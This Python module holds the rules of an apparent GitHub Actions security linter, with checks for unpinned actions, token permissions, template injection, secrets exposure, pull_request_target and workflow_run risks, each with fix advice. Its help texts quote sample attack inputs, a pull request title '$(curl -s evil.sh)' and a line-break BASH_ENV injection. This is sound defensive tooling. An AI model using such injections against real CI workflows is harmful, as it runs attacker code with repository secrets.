"""The checks. Each rule takes a parsed workflow and yields findings.

The rules follow GitHub's own "Security hardening for GitHub Actions" guidance; see the README
for the reasoning and links behind each one.
"""

from __future__ import annotations

import re
from collections.abc import Callable, Iterator
from dataclasses import dataclass
from itertools import groupby
from pathlib import Path

from yaml.nodes import MappingNode, Node, ScalarNode, SequenceNode

from .expressions import (
    ContextPath,
    Expression,
    ExpressionError,
    context_paths,
    find_expressions,
    matches,
)
from .model import Finding, Severity
from .project import repo_root
from .scripts import scripts
from .taint import INPUT, OUTSIDER, TOJSON, Taint, Tracker
from .workflow import Step, Workflow, get, items, key_node, scalar


@dataclass(frozen=True)
class Rule:
    id: str
    name: str
    summary: str
    check: Callable[[Workflow], Iterator[Finding]]
    help: str = ""
    """Why it matters and how to fix it; shown in code scanning (SARIF ``help``)."""


def _at(
    wf: Workflow, node: Node, rule_id: str, severity: Severity, message: str, line_offset: int = 0
) -> Finding:
    mark = node.start_mark
    return Finding(wf.path, mark.line + 1 + line_offset, mark.column + 1, rule_id, severity, message)


# --- WG001 unpinned actions -------------------------------------------------------------------

_SHA = re.compile(r"^[0-9a-f]{40}$")
# Actions maintained by GitHub itself. A moved tag there is far less likely than in a
# third-party action, so it's reported, but as low.
_FIRST_PARTY = ("actions/", "github/")


def unpinned_actions(wf: Workflow) -> Iterator[Finding]:
    for uses in wf.uses_nodes():
        yield from _check_uses(wf, uses)


def _check_uses(wf: Workflow, node: Node) -> Iterator[Finding]:
    ref = scalar(node)
    if not ref or ref.startswith("./"):
        return  # local actions live in this repository
    if ref.startswith("docker://"):
        if "@sha256:" not in ref:
            yield _at(
                wf,
                node,
                "WG001",
                Severity.MEDIUM,
                f"'{ref}' uses a Docker tag that can change; pin it with @sha256:<digest>",
            )
        return
    name, _, version = ref.partition("@")
    if not version:
        yield _at(wf, node, "WG001", Severity.HIGH, f"'{ref}' has no version at all; pin it to a commit SHA")
    elif not _SHA.match(version):
        severity = Severity.LOW if name.startswith(_FIRST_PARTY) else Severity.HIGH
        yield _at(
            wf,
            node,
            "WG001",
            severity,
            f"'{ref}' points to a tag or branch that can be moved; pin it to a full commit SHA",
        )


# --- WG002 / WG003 permissions --------------------------------------------------------------


def missing_permissions(wf: Workflow) -> Iterator[Finding]:
    if get(wf.root, "permissions") is not None:
        return
    without = [job_id for job_id, job in wf.jobs() if get(job, "permissions") is None]
    if without:
        node = key_node(wf.root, "jobs") or wf.root
        yield _at(
            wf,
            node,
            "WG002",
            Severity.MEDIUM,
            "no 'permissions:' at the top or in job(s) "
            + ", ".join(without)
            + "; the GITHUB_TOKEN gets the repository default, which may allow writes."
            " Add e.g. 'permissions: contents: read'",
        )


def write_all(wf: Workflow) -> Iterator[Finding]:
    candidates: list[tuple[str, Node | None]] = [("workflow", get(wf.root, "permissions"))]
    candidates += [(f"job '{job_id}'", get(job, "permissions")) for job_id, job in wf.jobs()]
    for where, node in candidates:
        if scalar(node) == "write-all":
            yield _at(
                wf, node, "WG003", Severity.HIGH, f"{where} grants 'write-all'; list only the scopes it needs"
            )


# --- WG004 template injection ---------------------------------------------------------------

_ADVICE = "pass it through 'env:' and use the variable instead"


def _other_callers(taint: Taint) -> str:
    """The end of a message for an input that several local callers fill with untrusted text."""
    if not taint.callers:
        return ""
    return f"; other callers pass untrusted text too: {'; '.join(taint.callers)}"


def _injection_message(path: ContextPath, taint: Taint) -> str:
    return _injection_text(path, taint) + _other_callers(taint)


def _injection_text(path: ContextPath, taint: Taint) -> str:
    """Direct uses keep their short message; a detour through env/outputs is spelled out."""
    if not taint.via:
        if taint.kind == TOJSON:
            return (
                f"toJSON({taint.source}) includes values outsiders can set, such as '{taint.example}',"
                f" and is pasted into a script; {_ADVICE}"
            )
        if taint.kind == INPUT:
            return (
                f"'{taint.source}' comes from the calling workflow, which may pass untrusted"
                f" text, and is pasted into a script; {_ADVICE}"
            )
        return f"'{taint.source}' can be set by outsiders and is pasted into a script; {_ADVICE}"

    origin = _origin(taint)
    if path.segments[0] == "env":
        # The variable is already in the environment: the shell can read it without pasting.
        name = taint.via[-1].split(" ", 1)[0].removeprefix("env.").removeprefix("$")
        advice = f'use the shell variable "${name}" instead'
    else:
        advice = _ADVICE
    return f"'{path}' carries {origin} (via {' -> '.join(taint.via)}) and is pasted into a script; {advice}"


def template_injection(wf: Workflow) -> Iterator[Finding]:
    tracker = Tracker(wf)
    for tracked in tracker.steps():
        for script in scripts(tracked.step, wf.script_inputs):
            node = script.node
            for expr in find_expressions(node.value):
                hit = tracker.taint_of_expression(expr, tracked.scope)
                if hit is None:
                    continue
                offset = node.value.count("\n", 0, expr.start)
                if node.style in ("|", ">"):
                    offset += 1  # the text starts on the line after "run: |"
                path, taint = hit
                message = _injection_message(path, taint) + script.hint()
                yield _at(wf, node, "WG004", taint.severity, message, line_offset=offset)


# --- WG007 untrusted text in $GITHUB_ENV / $GITHUB_PATH ----------------------------------------


def _origin(taint: Taint) -> str:
    return {
        OUTSIDER: f"'{taint.source}', which outsiders can set",
        TOJSON: f"toJSON({taint.source}), which includes values outsiders can set",
        INPUT: f"'{taint.source}' from the calling workflow, which may be untrusted",
    }[taint.kind]


_FILE_EFFECT = {
    "ENV": (
        "$GITHUB_ENV",
        "a line break in it can set any variable for the later steps (BASH_ENV, LD_PRELOAD,"
        " NODE_OPTIONS...), which runs code of the sender's choosing",
    ),
    "PATH": (
        "$GITHUB_PATH",
        "it can put a directory of the sender's choosing first in PATH for the later steps",
    ),
}


def untrusted_github_env(wf: Workflow) -> Iterator[Finding]:
    for tracked in Tracker(wf).steps():
        for write in tracked.writes:
            if write.key == "run":
                node = get(tracked.step.node, "run")
            else:
                node = get(get(tracked.step.node, "with"), "script")
            if not isinstance(node, ScalarNode):
                continue
            target, effect = _FILE_EFFECT[write.file]
            via = f" (via {' -> '.join(write.taint.via)})" if write.taint.via else ""
            offset = write.line + (1 if node.style in ("|", ">") else 0)
            yield _at(
                wf,
                node,
                "WG007",
                write.taint.severity,
                f"{_origin(write.taint)}{via} is written to {target}; {effect}."
                f" Keep it in a step output or a file instead{_other_callers(write.taint)}",
                line_offset=offset,
            )


# --- WG008 secrets exposure --------------------------------------------------------------------


def _scalars(node: Node | None) -> Iterator[ScalarNode]:
    """Every scalar value under ``node`` (mapping keys excluded)."""
    if isinstance(node, ScalarNode):
        yield node
    elif isinstance(node, MappingNode):
        for _key, value in node.value:
            yield from _scalars(value)
    elif isinstance(node, SequenceNode):
        for item in node.value:
            yield from _scalars(item)


def _expression_offset(node: ScalarNode, start: int) -> int:
    offset = node.value.count("\n", 0, start)
    return offset + 1 if node.style in ("|", ">") else offset


def _is_all_secrets(path: ContextPath) -> bool:
    return path.segments == ("secrets",) and path.function == "tojson"


def secrets_exposure(wf: Workflow) -> Iterator[Finding]:
    # toJSON(secrets): every secret of the repository in one value, wherever it is used.
    for node in _scalars(wf.root):
        for expr in find_expressions(node.value):
            if any(_is_all_secrets(path) for path in _paths(expr)):
                yield _at(
                    wf,
                    node,
                    "WG008",
                    Severity.HIGH,
                    "toJSON(secrets) puts every secret of the repository into one value; a single"
                    " log line, artifact or compromised step then leaks all of them. Pass only the"
                    " secrets this step needs, one by one",
                    line_offset=_expression_offset(node, expr.start),
                )

    # ${{ secrets.X }} pasted into a script.
    for step in wf.steps():
        for script in scripts(step, wf.script_inputs):
            node = script.node
            for expr in find_expressions(node.value):
                path = next(
                    (p for p in _paths(expr) if p.segments[0] == "secrets" and not _is_all_secrets(p)),
                    None,
                )
                if path is None:
                    continue
                name = str(path) if len(path.segments) > 1 else "secrets[...]"
                yield _at(
                    wf,
                    node,
                    "WG008",
                    Severity.MEDIUM,
                    f"'{name}' is pasted into the script text: quotes or '$' in the secret break the"
                    " script, and 'set -x', an error message or a process listing can show it."
                    f" Pass it through 'env:' and use the variable instead{script.hint()}",
                    line_offset=_expression_offset(node, expr.start),
                )

    # secrets: inherit to a reusable workflow in another repository.
    for job_id, job in wf.jobs():
        uses = scalar(get(job, "uses")) or ""
        if not uses or uses.startswith("./") or scalar(get(job, "secrets")) != "inherit":
            continue
        yield _at(
            wf,
            get(job, "secrets") or job,
            "WG008",
            Severity.MEDIUM,
            f"job '{job_id}' passes all of this repository's secrets ('secrets: inherit') to"
            f" '{uses}', a workflow in another repository; list the secrets it needs instead",
        )


def _paths(expr: Expression) -> list[ContextPath]:
    try:
        return context_paths(expr.inner)
    except ExpressionError:
        return []  # GitHub rejects the workflow before anything runs


# --- WG005 pull_request_target ---------------------------------------------------------------

_PR_HEAD = (
    ("github", "event", "pull_request", "head", "sha"),
    ("github", "event", "pull_request", "head", "ref"),
    ("github", "head_ref"),
)


def _checks_out_pr_code(ref: str) -> bool:
    """``ref:`` of actions/checkout naming the pull request's code: its head, by expression,
    or GitHub's ``refs/pull/<n>/head`` / ``merge`` refs."""
    if "refs/pull/" in ref:
        return True
    return any(
        matches(path.segments, pattern)
        for expr in find_expressions(ref)
        for path in _paths(expr)
        for pattern in _PR_HEAD
    )


def pull_request_target(wf: Workflow) -> Iterator[Finding]:
    if "pull_request_target" not in wf.triggers():
        return
    risky = False
    for step in wf.steps():
        if (step.uses or "").startswith("actions/checkout@"):
            if _checks_out_pr_code(step.with_value("ref") or ""):
                risky = True
                yield _at(
                    wf,
                    step.node,
                    "WG005",
                    Severity.HIGH,
                    "checks out the pull request's code under 'pull_request_target', which runs"
                    " with secrets and a write token; a fork's PR can then run its own code",
                )
    if not risky:
        node = key_node(wf.root, "on") or wf.root
        yield _at(
            wf,
            node,
            "WG005",
            Severity.LOW,
            "'pull_request_target' runs with secrets for pull requests from forks;"
            " make sure no step runs code from the pull request",
        )


# --- WG006 persisted credentials -------------------------------------------------------------


def persisted_credentials(wf: Workflow) -> Iterator[Finding]:
    for step in wf.steps():
        if not (step.uses or "").startswith("actions/checkout@"):
            continue
        if (step.with_value("persist-credentials") or "").lower() != "false":
            yield _at(
                wf,
                get(step.node, "uses") or step.node,
                "WG006",
                Severity.LOW,
                "actions/checkout leaves the token in .git/config for later steps;"
                " set 'persist-credentials: false' unless a step pushes",
            )


# --- WG009 workflow_run with the triggering run's code or artifacts ---------------------------

# The triggering run's commit: a fork's pull request when that run was a 'pull_request'.
_RUN_HEAD = (
    ("github", "event", "workflow_run", "head_sha"),
    ("github", "event", "workflow_run", "head_branch"),
    ("github", "event", "workflow_run", "head_commit"),
    ("github", "event", "workflow_run", "head_repository"),
    ("github", "event", "workflow_run", "pull_requests"),
)
# Triggers whose runs can carry a fork's code (a workflow_run chain can pass it on).
_UNTRUSTED_TRIGGERS = ("pull_request", "workflow_run")
_WORKSPACE_PATHS = {"", ".", "${{github.workspace}}", "$github_workspace", "${github_workspace}"}
_GH_RUN_DOWNLOAD = re.compile(r"\bgh\s+run\s+download\b")
_GH_RUN_DIR = re.compile(r"\s(?:-D|--dir)(?:\s|=)")
_FORK_RUN = "the triggering run can be a pull request from a fork"
# Any part of the triggering run: what `gh pr checkout` needs (a PR number, a branch name).
_RUN_ANY = (("github", "event", "workflow_run"),)
# git commands that bring a commit into the working tree, and `gh pr checkout`.
_GIT_CHECKOUT = re.compile(
    r"\bgit\s+(?:-[cC]\s+\S+\s+)*(?:checkout|switch|fetch|pull|reset|worktree\s+add)\b"
)
_GH_PR_CHECKOUT = re.compile(r"\bgh\s+pr\s+checkout\b")
_SHELL_VAR = re.compile(r"\$\{?([A-Za-z_][A-Za-z0-9_]*)")


def _names(text: str, patterns: tuple[tuple[str, ...], ...], env_vars: frozenset[str] = frozenset()) -> bool:
    """True if ``text`` refers to one of ``patterns``: in a ``${{ }}``, or through an ``env:``
    variable in ``env_vars`` (lower case), as ``${{ env.X }}`` or as ``$X`` in a script."""
    for expr in find_expressions(text):
        for path in _paths(expr):
            if any(matches(path.segments, pattern) for pattern in patterns):
                return True
            if len(path.segments) > 1 and path.segments[0] == "env" and path.segments[1] in env_vars:
                return True
    return any(name.lower() in env_vars for name in _SHELL_VAR.findall(text))


def _names_run_head(text: str) -> bool:
    return _names(text, _RUN_HEAD)


def _env_naming(patterns: tuple[tuple[str, ...], ...], *scopes: Node | None) -> frozenset[str]:
    """Names (lower case) of ``env:`` variables in these scopes whose value refers to
    ``patterns``. Later scopes override earlier ones, as in GitHub (workflow, job, step)."""
    env: dict[str, str] = {}
    for scope in scopes:
        for name, value in items(get(scope, "env")):
            env[name.lower()] = scalar(value) or ""
    return frozenset(name for name, value in env.items() if _names(value, patterns))


def _script_checks_out_run(run: str, head_vars: frozenset[str], run_vars: frozenset[str]) -> bool:
    """A ``run:`` script that checks out the triggering run's commit: ``git checkout/fetch/...``
    of its head, or ``gh pr checkout`` of its pull request."""
    for line in run.replace("\\\n", " ").splitlines():
        if _GIT_CHECKOUT.search(line) and _names(line, _RUN_HEAD, head_vars):
            return True
        if _GH_PR_CHECKOUT.search(line) and _names(line, _RUN_ANY, run_vars):
            return True
    return False


def _branch_filter_note(wf: Workflow) -> str:
    """``branches:`` under ``on.workflow_run`` looks like protection but isn't."""
    trigger = get(get(wf.root, "on"), "workflow_run")
    for key in ("branches", "branches-ignore"):
        if get(trigger, key) is not None:
            return (
                f" ('{key}:' under 'on.workflow_run' doesn't prevent that: it matches the branch"
                " name of the fork's pull request, which the fork picks)"
            )
    return ""


def _workflow_name(wf: Workflow, root: Path) -> str:
    """What ``on.workflow_run.workflows`` calls ``wf``: its ``name:``, else its path."""
    if name := scalar(get(wf.root, "name")):
        return name
    path = Path(wf.path).resolve()
    return path.relative_to(root).as_posix() if path.is_relative_to(root) else wf.path


def _fork_runs(wf: Workflow) -> str | None:
    """Why the triggering run's code and artifacts may be a stranger's; None when every
    workflow named under ``on.workflow_run.workflows`` is among the checked files and none of
    them runs for pull requests (their runs then only build this repository's own commits)."""
    listed = get(get(get(wf.root, "on"), "workflow_run"), "workflows")
    if isinstance(listed, SequenceNode):
        names = [n.value for n in listed.value if isinstance(n, ScalarNode)]
    else:
        names = [listed.value] if isinstance(listed, ScalarNode) else []
    root = repo_root(Path(wf.path))
    if wf.project is None or root is None or not names:
        return _FORK_RUN
    known = {
        _workflow_name(other, root): other
        for other in wf.project.files.values()
        if not other.is_action and repo_root(Path(other.path)) == root
    }
    reasons = []
    for name in names:
        if (other := known.get(name)) is None:
            return _FORK_RUN
        if found := [t for t in _UNTRUSTED_TRIGGERS if t in other.triggers()]:
            reasons.append(f"'{name}' runs on {found[0]}")
    if not reasons:
        return None
    return f"{', '.join(reasons)}, so the triggering run can be a pull request from a fork"


def _in_workspace(path: str) -> bool:
    return re.sub(r"\s+", "", path.lower()).rstrip("/") in _WORKSPACE_PATHS


def _artifact_download(step: Step) -> bool | None:
    """None if the step doesn't download another run's artifacts; else whether it unpacks them
    straight into the workspace, where they can replace the repository's own files."""
    uses = step.uses or ""
    if uses.startswith("actions/download-artifact@"):
        if step.with_value("run-id") is None:
            return None  # this run's own artifacts
        return _in_workspace(step.with_value("path") or "")
    if uses.startswith("dawidd6/action-download-artifact@"):
        return _in_workspace(step.with_value("path") or "")
    if uses.startswith("actions/github-script@") and "downloadArtifact" in (step.with_value("script") or ""):
        return False  # the script decides where the zip goes; at least it isn't unpacked yet
    run = scalar(get(step.node, "run")) or ""
    if _GH_RUN_DOWNLOAD.search(run):
        return not _GH_RUN_DIR.search(run)
    return None


def _runs_workspace_code(step: Step) -> bool:
    return get(step.node, "run") is not None or (step.uses or "").startswith("./")


def workflow_run(wf: Workflow) -> Iterator[Finding]:
    if wf.is_action or "workflow_run" not in wf.triggers():
        return
    if (why := _fork_runs(wf)) is None:
        return
    why += _branch_filter_note(wf)
    jobs = dict(wf.jobs())
    for job_id, job_steps in groupby(wf.steps(), key=lambda step: step.job_id):
        steps = list(job_steps)
        for i, step in enumerate(steps):
            scopes = (wf.root, jobs.get(job_id), step.node)
            run = scalar(get(step.node, "run"))
            if run is not None and _script_checks_out_run(
                run, _env_naming(_RUN_HEAD, *scopes), _env_naming(_RUN_ANY, *scopes)
            ):
                yield _at(
                    wf,
                    step.node,
                    "WG009",
                    Severity.HIGH,
                    "checks out the triggering run's code with git or gh in a script, under"
                    f" 'workflow_run', which runs with secrets and a write token; {why}, and its"
                    " code then runs here",
                )
                continue
            if (step.uses or "").startswith("actions/checkout@"):
                if _names_run_head(step.with_value("ref") or "") or _names_run_head(
                    step.with_value("repository") or ""
                ):
                    yield _at(
                        wf,
                        step.node,
                        "WG009",
                        Severity.HIGH,
                        "checks out the triggering run's code under 'workflow_run', which runs with"
                        f" secrets and a write token; {why}, and its code then runs here",
                    )
                continue
            if (into_workspace := _artifact_download(step)) is None:
                continue
            later = next((s for s in steps[i + 1 :] if _runs_workspace_code(s)), None)
            if into_workspace and later is not None:
                yield _at(
                    wf,
                    step.node,
                    "WG009",
                    Severity.HIGH,
                    "unpacks the triggering run's artifacts into the workspace, where they can"
                    " replace the repository's scripts and config, and the step at line"
                    f" {later.node.start_mark.line + 1} runs commands there with secrets; {why}."
                    " Download to ${{ runner.temp }} instead and treat the files as data",
                )
            else:
                yield _at(
                    wf,
                    step.node,
                    "WG009",
                    Severity.MEDIUM,
                    f"downloads the triggering run's artifacts under 'workflow_run'; {why}."
                    " Treat their contents as untrusted data: don't run or source them, and don't"
                    " paste them into scripts or $GITHUB_ENV",
                )


# --- WG010 comment commands without a check of the commenter ---------------------------------

# Who wrote the comment: checking one of these in an 'if:' is a permission check.
_COMMENTER = (
    ("github", "event", "comment", "author_association"),
    ("github", "event", "comment", "user", "login"),
    ("github", "event", "sender", "login"),
    ("github", "actor"),
    ("github", "triggering_actor"),
)
_COMMENT_BODY = (("github", "event", "comment", "body"),)
# Actions that fail (or skip) unless the commenter may write to the repository.
_PERMISSION_ACTIONS = (
    "actions-cool/check-user-permission",
    "prince-chrismc/check-actor-permissions-action",
    "sushichop/action-repository-permission",
    "lannonbr/repo-permission-check-action",
    "xt0rted/slash-command-action",
    "peter-evans/slash-command-dispatch",
)
_PERMISSION_API = re.compile(r"getCollaboratorPermissionLevel|collaborators/\S+/permission")
# A ref naming the pull request: its number, its head, or a value looked up at run time.
_PR_REF = (
    ("github", "event", "issue", "number"),
    ("github", "event", "issue", "pull_request"),
    ("github", "event", "pull_request"),
    ("github", "head_ref"),
    ("steps",),
    ("needs",),
)
_PR_SCRIPT = re.compile(
    r"\bgh\s+pr\s+checkout\b|\bpull/(?:\$\{\{[^}]*\}\}|[^\s/]+)/(?:head|merge)\b|refs/pull/"
)


def _if_paths(node: Node | None) -> list[ContextPath]:
    """Context paths in an ``if:``, written with or without ``${{ }}``."""
    text = (scalar(get(node, "if")) or "").strip()
    if text.startswith("${{") and text.endswith("}}"):
        text = text[3:-2]
    try:
        return context_paths(text) if text else []
    except ExpressionError:
        return []


def _mentions(paths: list[ContextPath], patterns: tuple[tuple[str, ...], ...]) -> bool:
    return any(matches(path.segments, pattern) for path in paths for pattern in patterns)


def _checks_permission(step: Step) -> bool:
    """A step that stops the job unless the commenter may write: a known action, or an API call
    for the commenter's permission (github-script or ``gh api`` in a script)."""
    if (step.uses or "").split("@", 1)[0].lower() in _PERMISSION_ACTIONS:
        return True
    text = (scalar(get(step.node, "run")) or "") + (step.with_value("script") or "")
    return bool(_PERMISSION_API.search(text))


def _job_checks_commenter(wf: Workflow, job_id: str, seen: frozenset[str] = frozenset()) -> bool:
    """The job's ``if:`` checks who commented, one of its steps checks their permission, or a
    job it ``needs:`` (directly or further up) does."""
    jobs = dict(wf.jobs())
    job = jobs.get(job_id)
    if job is None or job_id in seen:
        return False
    if _mentions(_if_paths(job), _COMMENTER):
        return True
    if any(_checks_permission(step) for step in wf.steps() if step.job_id == job_id):
        return True
    needs = get(job, "needs")
    names = (
        [n.value for n in needs.value if isinstance(n, ScalarNode)] if isinstance(needs, SequenceNode) else []
    )
    if isinstance(needs, ScalarNode):
        names = [needs.value]
    return any(_job_checks_commenter(wf, name, seen | {job_id}) for name in names)


def _checks_out_pr(step: Step) -> bool:
    if (step.uses or "").startswith("actions/checkout@"):
        for key in ("ref", "repository"):
            value = step.with_value(key) or ""
            if "refs/pull/" in value or any(
                _mentions(_paths(expr), _PR_REF) for expr in find_expressions(value)
            ):
                return True
        return False
    return bool(_PR_SCRIPT.search(scalar(get(step.node, "run")) or ""))


def _uses_secrets(node: Node) -> bool:
    """``${{ secrets.X }}`` anywhere in the job, other than the GITHUB_TOKEN."""
    return any(
        path.segments[0] == "secrets" and path.segments[1:2] != ("github_token",)
        for text in _scalars(node)
        for expr in find_expressions(text.value)
        for path in _paths(expr)
    )


def _body_only(*nodes: Node | None) -> str:
    if any(_mentions(_if_paths(node), _COMMENT_BODY) for node in nodes):
        return " (its 'if:' only looks at the comment's text, which anyone can write)"
    return ""


_ASK = (
    "check github.event.comment.author_association (OWNER, MEMBER, COLLABORATOR) in the job's"
    " 'if:', or the commenter's permission in a first step"
)


def comment_commands(wf: Workflow) -> Iterator[Finding]:
    if wf.is_action or "issue_comment" not in wf.triggers():
        return
    for job_id, job in wf.jobs():
        if _job_checks_commenter(wf, job_id):
            continue
        reported = False
        steps = [step for step in wf.steps() if step.job_id == job_id]
        for step in steps:
            if _mentions(_if_paths(step.node), _COMMENTER) or not _checks_out_pr(step):
                continue
            reported = True
            yield _at(
                wf,
                step.node,
                "WG010",
                Severity.HIGH,
                "checks out the pull request's code in a job that anyone who can comment can"
                " start ('issue_comment' runs with secrets and a write token), without checking"
                f" who commented{_body_only(job, step.node)}; {_ASK}",
            )
        if not reported and _uses_secrets(job):
            yield _at(
                wf,
                key_node(get(wf.root, "jobs"), job_id) or job,
                "WG010",
                Severity.MEDIUM,
                f"job '{job_id}' uses secrets and anyone who can comment can start it"
                f" ('issue_comment'), without a check of who commented{_body_only(job)}; {_ASK}",
            )


RULES: tuple[Rule, ...] = (
    Rule(
        "WG001",
        "unpinned-action",
        "Actions and reusable workflows not pinned to a commit SHA",
        unpinned_actions,
        help=(
            "A tag or branch such as @v4 can be moved to different code after you've reviewed it; a "
            "full 40-character commit SHA can't. Pin with uses: owner/repo@<sha>  # v4 (workflow-"
            "guard --fix does this)."
        ),
    ),
    Rule(
        "WG002",
        "missing-permissions",
        "No explicit GITHUB_TOKEN permissions",
        missing_permissions,
        help=(
            "Without permissions: the GITHUB_TOKEN gets the repository's default, which may be "
            "read/write for everything. Add permissions: contents: read at the top and widen it per "
            "job only where needed."
        ),
    ),
    Rule(
        "WG003",
        "write-all",
        "'permissions: write-all'",
        write_all,
        help=(
            "write-all gives every step a token that can push code, create releases and change "
            "issues. List only the scopes the job needs."
        ),
    ),
    Rule(
        "WG004",
        "template-injection",
        "Untrusted ${{ }} values (or inputs from unknown callers) inside run:, github-script or"
        " an action's script input",
        template_injection,
        help=(
            "${{ }} values are pasted into the script before it runs, so a pull request title like "
            '$(curl -s evil.sh) runs as code. Pass the value through env: and use "$VAR" in the '
            "script instead. In a composite action or reusable workflow the same goes for "
            "${{ inputs.* }}: the calling workflow may pass untrusted text. Actions that run an "
            "input as a script (appleboy/ssh-action's script, azure/cli's inlineScript, ...) are "
            "checked too."
        ),
    ),
    Rule(
        "WG005",
        "pull-request-target",
        "pull_request_target, especially with a checkout of the PR",
        pull_request_target,
        help=(
            "pull_request_target runs with secrets and a write token even for pull requests from "
            "forks. Never check out and run the pull request's code in it; use pull_request instead "
            "where possible."
        ),
    ),
    Rule(
        "WG006",
        "persisted-credentials",
        "actions/checkout without persist-credentials: false",
        persisted_credentials,
        help=(
            "actions/checkout stores the token in .git/config, where every later step (and anything "
            "it downloads) can read it. Set persist-credentials: false unless a step pushes."
        ),
    ),
    Rule(
        "WG007",
        "untrusted-github-env",
        "Untrusted text written to $GITHUB_ENV or $GITHUB_PATH",
        untrusted_github_env,
        help=(
            "Every later step of the job reads $GITHUB_ENV and $GITHUB_PATH. A pull request title "
            "with a line break such as 'x\\nBASH_ENV=/tmp/evil.sh' then sets a variable that makes "
            "bash run the sender's script; $GITHUB_PATH can put their directory first in PATH. "
            "Pass the value to the step that needs it through env: or a step output instead."
        ),
    ),
    Rule(
        "WG008",
        "secrets-exposure",
        "Secrets pasted into scripts, toJSON(secrets), or 'secrets: inherit' to another repository",
        secrets_exposure,
        help=(
            "${{ secrets.X }} inside run: becomes part of the script text, where quotes break it and "
            'logs or process listings can show it; pass it through env: and use "$X". '
            "toJSON(secrets) and 'secrets: inherit' to a reusable workflow in another repository "
            "hand out every secret at once; pass only the ones needed."
        ),
    ),
    Rule(
        "WG009",
        "workflow-run",
        "workflow_run that checks out or downloads artifacts of the triggering run",
        workflow_run,
        help=(
            "A workflow_run workflow runs with secrets and a write token, but the run that triggered "
            "it may have built a fork's pull request: its commit and its artifacts are the fork "
            "author's. Don't check out that commit. Download artifacts to ${{ runner.temp }}, not "
            "the workspace, and treat them as data: never run, source or paste them into scripts."
        ),
    ),
    Rule(
        "WG010",
        "comment-command",
        "issue_comment jobs that check out the PR or use secrets without checking the commenter",
        comment_commands,
        help=(
            "issue_comment runs with secrets and a write token, and anyone who can comment on an "
            "issue or pull request (on a public repository: anyone) starts it. A '/deploy' or '/test' "
            "command must check who commented: github.event.comment.author_association in "
            "(OWNER, MEMBER, COLLABORATOR) in the job's if:, or the commenter's permission through "
            "the API. Matching the comment's text is not a check."
        ),
    ),
)
RULE_IDS = frozenset(r.id for r in RULES)


def check(wf: Workflow, ignore: frozenset[str] = frozenset()) -> list[Finding]:
    """All findings for one workflow, minus ignored rules and inline ``ignore[...]`` comments."""
    found: list[Finding] = []
    for rule in RULES:
        if rule.id in ignore:
            continue
        for finding in rule.check(wf):
            if not wf.is_ignored(finding.line, finding.rule_id):
                found.append(finding)
    return sorted(found)
